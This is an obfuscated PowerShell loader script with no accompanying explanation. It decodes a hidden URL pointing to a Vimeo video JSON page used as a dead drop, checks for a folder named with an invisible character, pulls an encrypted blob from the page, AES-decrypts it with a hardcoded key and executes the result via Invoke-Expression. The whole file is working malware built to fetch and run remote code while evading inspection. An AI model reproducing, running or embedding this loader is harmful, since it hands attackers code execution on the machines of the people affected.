$uuid = "665b830abe6311ed965fd83bbf1b5c98";$qtsm = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6L" + "y92aW1lby5jb20vYXBp" + "L3YyL3ZpZGVvLzgwND" + "gzODg5NS5qc29u"));$xvqg = "kvdrfWrnP0G1j0HlFPto3sjoSi3Bb6Jx8/MdnzyZt00=";$xyqm = $(get-location).Path;$ysnq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("44Wk"));$nnxs = $xyqm + "\" + $ysnq + "\";if (Test-Path -Path $nnxs -PathType Container) {$lpom = (new-object Net.WebClient).DownloadString($qtsm);$pqmc = [regex]::Match($lpom, "::\?\?(.*?)\?:\?:").Groups[1].Value;$pqmc = $pqmc -replace "\\", "";$aocb = [System.Convert]::FromBase64String($pqmc);$pla = $aocb[0..15];$qskf = New-Object "System.Security.Cryptography.AesManaged";$qskf.Mode = [System.Security.Cryptography.CipherMode]::CBC;$qskf.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$qskf.BlockSize = 128;$qskf.KeySize = 256;$qskf.IV = $pla;$qskf.Key = [System.Convert]::FromBase64String($xvqg);$awyt = $qskf.CreateDecryptor();$tqkd = $awyt.TransformFinalBlock($aocb, 16, $aocb.Length - 16);$wjeg = [System.Text.Encoding]::UTF8.GetString($tqkd).Trim([char]0);Invoke-Expression $wjeg;}
